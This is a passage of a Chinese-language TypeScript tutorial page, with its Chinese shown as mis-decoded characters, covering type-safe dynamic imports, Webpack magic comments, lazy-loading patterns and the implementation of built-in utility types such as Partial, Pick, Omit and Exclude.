class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¿è¡Œæ—¶ç±»å‹éªŒè¯</span><br><span class="hljs-keyword">import</span> &#123; is &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;typescript-is&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">loadModule</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./plugin&#x27;</span>);<br>  <br>  <span class="hljs-keyword">if</span> (!is&lt;<span class="hljs-title class_">PluginInterface</span>&gt;(mod)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Invalid plugin interface&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> mod;<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="3"><li>ç±»å‹æ–­è¨€è¾…åŠ©ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åˆ›å»ºç±»å‹æ–­è¨€å‡½æ•°</span><br><span class="hljs-keyword">function</span> assertModule&lt;T&gt;(<span class="hljs-attr">module</span>: <span class="hljs-built_in">any</span>, <span class="hljs-attr">key</span>: keyof T): asserts <span class="hljs-variable language_">module</span> is T &#123;<br>  <span class="hljs-keyword">if</span> (!(key <span class="hljs-keyword">in</span> <span class="hljs-variable language_">module</span>)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Module missing required export: <span class="hljs-subst">$&#123;<span class="hljs-built_in">String</span>(key)&#125;</span>`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./validator&#x27;</span>);<br>assertModule&lt;&#123; <span class="hljs-attr">validate</span>: <span class="hljs-title class_">Function</span> &#125;&gt;(mod, <span class="hljs-string">&#x27;validate&#x27;</span>);<br>mod.<span class="hljs-title function_">validate</span>(input); <span class="hljs-comment">// å®‰å…¨è°ƒç”¨</span><br></code></pre></td></tr></table></figure><p><strong>Webpack é­”æ³•æ³¨é‡Š</strong></p><ol><li>åŸºç¡€æ³¨é‡Šï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å‘½åä»£ç å—</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;math&quot; */</span> <span class="hljs-string">&#x27;./math&#x27;</span>);<br><br><span class="hljs-comment">// é¢„è·å–</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackPrefetch: true */</span> <span class="hljs-string">&#x27;./prefetch-module&#x27;</span>);<br><br><span class="hljs-comment">// é¢„åŠ è½½</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackPreload: true */</span> <span class="hljs-string">&#x27;./critical-module&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="2"><li>ç»„åˆä½¿ç”¨ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒå¯ç”¨é¢„å–</span><br><span class="hljs-keyword">const</span> isProd = process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>;<br><span class="hljs-keyword">const</span> comments = isProd ? <span class="hljs-string">&#x27;webpackPrefetch: true&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;utils&quot;, $&#123;comments&#125; */</span> <span class="hljs-string">&#x27;./utils&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µæŒ‡å—</strong></p><ol><li>ä»£ç åˆ†å‰²ç­–ç•¥ï¼š</li></ol><table><thead><tr><th align="left">åˆ†å‰²ç²’åº¦</th><th align="left">é€‚åˆåœºæ™¯</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">è·¯ç”±çº§</td><td align="left">SPAåº”ç”¨</td><td align="left"><code>lazy(() =&gt; import(&#39;./page&#39;))</code></td></tr><tr><td align="left">ç»„ä»¶çº§</td><td align="left">å¤§å‹ç»„ä»¶&#x2F;ä¸‰æ–¹ç»„ä»¶</td><td align="left"><code>const Heavy = lazy(() =&gt; import(...))</code></td></tr><tr><td align="left">åº“çº§</td><td align="left">ç¬¬ä¸‰æ–¹å¤§ä½“ç§¯åº“</td><td align="left"><code>import(&#39;lodash/debounce&#39;)</code></td></tr><tr><td align="left">åŠŸèƒ½çº§</td><td align="left">éé¦–å±å…³é”®åŠŸèƒ½</td><td align="left">ç‚¹å‡»ååŠ è½½ç¼–è¾‘å™¨æ¨¡å—</td></tr></tbody></table><ol start="2"><li>åŠ è½½çŠ¶æ€ç®¡ç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è‡ªå®šä¹‰åŠ è½½çŠ¶æ€</span><br><span class="hljs-keyword">function</span> useLazyModule&lt;T&gt;(<span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;T&gt;) &#123;<br>  <span class="hljs-keyword">const</span> [<span class="hljs-variable language_">module</span>, setModule] = useState&lt;T | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);<br>  <span class="hljs-keyword">const</span> [error, setError] = useState&lt;<span class="hljs-title class_">Error</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">loader</span>()<br>      .<span class="hljs-title function_">then</span>(setModule)<br>      .<span class="hljs-title function_">catch</span>(setError)<br>      .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>));<br>  &#125;, []);<br><br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-variable language_">module</span>, loading, error &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">module</span>: math, loading &#125; = <span class="hljs-title function_">useLazyModule</span>(<span class="hljs-function">() =&gt;</span> <br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./math&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.<span class="hljs-property">default</span>)<br>);<br></code></pre></td></tr></table></figure><ol start="3"><li>é”™è¯¯è¾¹ç•Œå¤„ç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// React é”™è¯¯è¾¹ç•Œ</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FallbackUI</span> /&gt;</span></span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>&lt;<span class="hljs-title class_">LazyErrorBoundary</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">React.Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">LazyComponent</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">React.Suspense</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">LazyErrorBoundary</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</strong></p><ol><li>é¢„åŠ è½½å…³é”®æ¨¡å—ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é¦–å±æ¸²æŸ“åé¢„åŠ è½½</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./next-page&#x27;</span>).<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);<br>&#125;, []);<br></code></pre></td></tr></table></figure><ol start="2"><li>æ‰¹é‡åŠ è½½ç­–ç•¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŒæ—¶åŠ è½½å¤šä¸ªæ¨¡å—</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">loadDashboardModules</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./chart&#x27;</span>),<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./stats&#x27;</span>),<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./recent-activity&#x27;</span>)<br>]);<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-title function_">loadDashboardModules</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">[chart, stats, activity]</span>) =&gt;</span> &#123;<br>  chart.<span class="hljs-title function_">render</span>();<br>  stats.<span class="hljs-title function_">update</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><ol start="3"><li>è¯·æ±‚åˆå¹¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨Webpacké­”æ³•æ³¨é‡Šåˆå¹¶è¯·æ±‚</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">getEditor</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackMode: &quot;lazy-once&quot; */</span> <span class="hljs-string">&#x27;./editor&#x27;</span>);<br><br><span class="hljs-comment">// ä¸åŒåœ°æ–¹è°ƒç”¨åªåŠ è½½ä¸€æ¬¡</span><br>button1.<span class="hljs-property">onclick</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">getEditor</span>().<span class="hljs-title function_">then</span>(...);<br>button2.<span class="hljs-property">onclick</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">getEditor</span>().<span class="hljs-title function_">then</span>(...);<br></code></pre></td></tr></table></figure><p><strong>ç±»å‹å®‰å…¨é™·é˜±ä¸è§£å†³æ–¹æ¡ˆ</strong></p><p>é™·é˜±1ï¼šæ¨¡å—ç±»å‹æ¼‚ç§»</p><p>ç°è±¡ï¼šæ¨¡å—æ›´æ–°åç±»å‹ä¸åŒ¹é…</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç‰ˆæœ¬åŒ–ç±»å‹å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;./chart&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ChartV2</span> &#123;<br>    <span class="hljs-title function_">newMethod</span>(): <span class="hljs-built_in">void</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">chart</span>: <span class="hljs-title class_">ChartV2</span>;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> chart;<br>&#125;<br></code></pre></td></tr></table></figure><p>é™·é˜±2ï¼šåŠ¨æ€è·¯å¾„ç±»å‹ä¸¢å¤±</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è·¯å¾„æ˜ å°„ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ModulePaths</span> = <br>  | <span class="hljs-string">&#x27;./math&#x27;</span> <br>  | <span class="hljs-string">&#x27;./chart&#x27;</span> <br>  | <span class="hljs-string">&#x27;./utils&#x27;</span>;<br><br><span class="hljs-keyword">function</span> loadModule&lt;T&gt;(<span class="hljs-attr">path</span>: <span class="hljs-title class_">ModulePaths</span>): <span class="hljs-title class_">Promise</span>&lt;T&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(path) <span class="hljs-keyword">as</span> <span class="hljs-title class_">Promise</span>&lt;T&gt;;<br>&#125;<br></code></pre></td></tr></table></figure><p>é™·é˜±3ï¼šCJS&#x2F;ESM äº’æ“ä½œé—®é¢˜</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç»Ÿä¸€å°è£…</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadCompatModule</span>(<span class="hljs-params"><span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(path);<br>  <span class="hljs-keyword">return</span> mod.<span class="hljs-property">default</span> || mod;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="äºŒã€é«˜çº§ç±»å‹ç³»ç»Ÿ"><a href="#äºŒã€é«˜çº§ç±»å‹ç³»ç»Ÿ" class="headerlink" title="äºŒã€é«˜çº§ç±»å‹ç³»ç»Ÿ"></a>äºŒã€é«˜çº§ç±»å‹ç³»ç»Ÿ</h1><h2 id="2-1-å·¥å…·ç±»å‹åŸç†"><a href="#2-1-å·¥å…·ç±»å‹åŸç†" class="headerlink" title="2.1 å·¥å…·ç±»å‹åŸç†"></a>2.1 å·¥å…·ç±»å‹åŸç†</h2><h3 id="2-1-1-å†…ç½®å·¥å…·ç±»å‹æºç è§£æ"><a href="#2-1-1-å†…ç½®å·¥å…·ç±»å‹æºç è§£æ" class="headerlink" title="2.1.1 å†…ç½®å·¥å…·ç±»å‹æºç è§£æ"></a>2.1.1 å†…ç½®å·¥å…·ç±»å‹æºç è§£æ</h3><p>TypeScript å†…ç½®å·¥å…·ç±»å‹é€šè¿‡æ¡ä»¶ç±»å‹å’Œæ˜ å°„ç±»å‹å®ç°</p><p><strong>åŸºç¡€å·¥å…·ç±»å‹</strong></p><ol><li><code>Partial&lt;T&gt;</code>ï¼šå°†ç±»å‹ T çš„æ‰€æœ‰å±æ€§å˜ä¸ºå¯é€‰</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Partial</span>&lt;T&gt; = &#123;<br>  [P <span class="hljs-keyword">in</span> keyof T]?: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šæ˜ å°„ç±»å‹ + ? ä¿®é¥°ç¬¦</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">PartialUser</span> = <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">User</span>&gt;; <span class="hljs-comment">// &#123; name?: string; age?: number &#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>Required&lt;T&gt;</code>ï¼šå°†ç±»å‹ T çš„æ‰€æœ‰å±æ€§å˜ä¸ºå¿…å¡«</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Required</span>&lt;T&gt; = &#123;<br>  [P <span class="hljs-keyword">in</span> keyof T]-?: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šæ˜ å°„ç±»å‹ + -? ç§»é™¤å¯é€‰ä¿®é¥°ç¬¦</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">RequiredUser</span> = <span class="hljs-title class_">Required</span>&lt;<span class="hljs-title class_">PartialUser</span>&gt;; <span class="hljs-comment">// &#123; name: string; age: number &#125;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><code>Readonly&lt;T&gt;</code>ï¼šå°†ç±»å‹ T çš„æ‰€æœ‰å±æ€§å˜ä¸ºåªè¯»</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Readonly</span>&lt;T&gt; = &#123;<br>  <span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šæ˜ å°„ç±»å‹ + readonly ä¿®é¥°ç¬¦</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyUser</span> = <span class="hljs-title class_">Readonly</span>&lt;<span class="hljs-title class_">User</span>&gt;; <span class="hljs-comment">// &#123; readonly name: string; readonly age: number &#125;</span><br></code></pre></td></tr></table></figure><p><strong>ç»“æ„æ“ä½œå·¥å…·ç±»å‹</strong></p><ol><li><code>Pick&lt;T, K extends keyof T&gt;</code>: ä»ç±»å‹ T ä¸­é€‰å–æŒ‡å®šå±æ€§ K</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Pick</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt; = &#123;<br>  [P <span class="hljs-keyword">in</span> K]: T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šæ˜ å°„ç±»å‹ + é”®åçº¦æŸ</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">NameOnly</span> = <span class="hljs-title class_">Pick</span>&lt;<span class="hljs-title class_">User</span>, <span class="hljs-string">&#x27;name&#x27;</span>&gt;; <span class="hljs-comment">// &#123; name: string &#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>Omit&lt;T, K extends keyof any&gt;</code>: ä»ç±»å‹ T ä¸­æ’é™¤æŒ‡å®šå±æ€§ K</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Omit</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof <span class="hljs-built_in">any</span>&gt; = <span class="hljs-title class_">Pick</span>&lt;T, <span class="hljs-title class_">Exclude</span>&lt;keyof T, K&gt;&gt;;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šç»„åˆ Pick å’Œ Exclude</li><li>æºç ä¾èµ–ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Exclude</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? <span class="hljs-built_in">never</span> : T;<br></code></pre></td></tr></table></figure><ul><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">WithoutAge</span> = <span class="hljs-title class_">Omit</span>&lt;<span class="hljs-title class_">User</span>, <span class="hljs-string">&#x27;age&#x27;</span>&gt;; <span class="hljs-comment">// &#123; name: string &#125;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><code>Record&lt;K extends keyof any, T&gt;</code>: åˆ›å»ºé”®ä¸º Kã€å€¼ä¸º T çš„ç±»å‹</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Record</span>&lt;K <span class="hljs-keyword">extends</span> keyof <span class="hljs-built_in">any</span>, T&gt; = &#123;<br>  [P <span class="hljs-keyword">in</span> K]: T;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šåŠ¨æ€é”®æ˜ å°„</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">UserMap</span> = <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">User</span>&gt;; <span class="hljs-comment">// &#123; [key: string]: User &#125;</span><br></code></pre></td></tr></table></figure><p><strong>ç±»å‹æ“ä½œå·¥å…·ç±»å‹</strong></p><ol><li><code>Exclude&lt;T, U&gt;</code>: ä» T ä¸­æ’é™¤å¯åˆ†é…ç»™ U çš„ç±»å‹</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Exclude</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? <span class="hljs-built_in">never</span> : T;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šæ¡ä»¶ç±»å‹ + never</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T0</span> = <span class="hljs-title class_">Exclude</span>&lt;<span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-string">&quot;b&quot;</span> | <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>&gt;; <span class="hljs-comment">// &quot;b&quot; | &quot;c&quot;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>Extract&lt;T, U&gt;</code>: ä» T ä¸­æå–å¯åˆ†é…ç»™ U çš„ç±»å‹</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Extract</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? T : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šæ¡ä»¶ç±»å‹åå‘æ“ä½œ</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T1</span> = <span class="hljs-title class_">Extract</span>&lt;<span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-string">&quot;b&quot;</span> | <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-string">&quot;f&quot;</span>&gt;; <span class="hljs-comment">// &quot;a&quot;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><code>NonNullable&lt;T&gt;</code>: ä» T ä¸­æ’é™¤ null å’Œ undefined</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">NonNullable</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span> ? <span class="hljs-built_in">never</span> : T;<br></code></pre></td></tr></table></figure><ul><li>å®ç°åŸç†ï¼šæ¡ä»¶ç±»å‹è¿‡æ»¤</li><li>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-variable constant_">T2</span> = <span class="hljs-title class_">NonNullable</span>&lt;<span class="hljs-built_in">string</span> | <span 